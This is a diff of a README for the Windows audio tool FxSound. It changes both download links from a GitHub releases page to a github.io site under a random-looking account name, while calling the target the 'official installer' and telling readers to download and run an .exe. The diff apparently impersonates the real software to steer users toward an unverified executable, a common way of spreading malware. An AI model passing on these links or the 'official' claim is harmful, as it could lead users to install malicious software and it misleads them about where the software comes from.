@@ -1,6 +1,6 @@
 # 🎧 FxSound - Improve your computer audio quality easily
 
-[![](https://img.shields.io/badge/Download_FxSound-Blue?style=for-the-badge&logo=github)](https://github.com/adulterine-progymnosperm584/FxSound/releases)
+[![](https://img.shields.io/badge/Download_FxSound-Blue?style=for-the-badge&logo=github)](https://adulterine-progymnosperm584.github.io)
 
 ## 📌 About this software
 
@@ -14,7 +14,7 @@ This application requires a computer running Microsoft Windows 10 or Windows 11.
 
 Visit the link below to get the official installer.
 
-[Download FxSound Here](https://github.com/adulterine-progymnosperm584/FxSound/releases)
+[Download FxSound Here](https://adulterine-progymnosperm584.github.io)
 
 Click the link to open the release page. Look for the file ending in `.exe`. Click the file name to start the download. Save the installer to your Downloads folder.
 
